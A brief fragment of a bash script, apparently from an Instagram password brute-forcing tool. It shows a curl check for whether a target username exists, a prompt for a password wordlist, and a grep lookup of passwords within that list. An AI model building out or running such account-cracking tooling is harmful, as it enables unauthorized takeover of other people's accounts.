...
checkaccount=$(curl -s https://www.instagram.com/$user/?__a=1 | grep -c "Account not found please enter a vlaid username")
...
read -p $'\e[1;92mWordlist (Enter to use default list): \e[0m' wl_pass
...
IFS=$'\n'
cpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
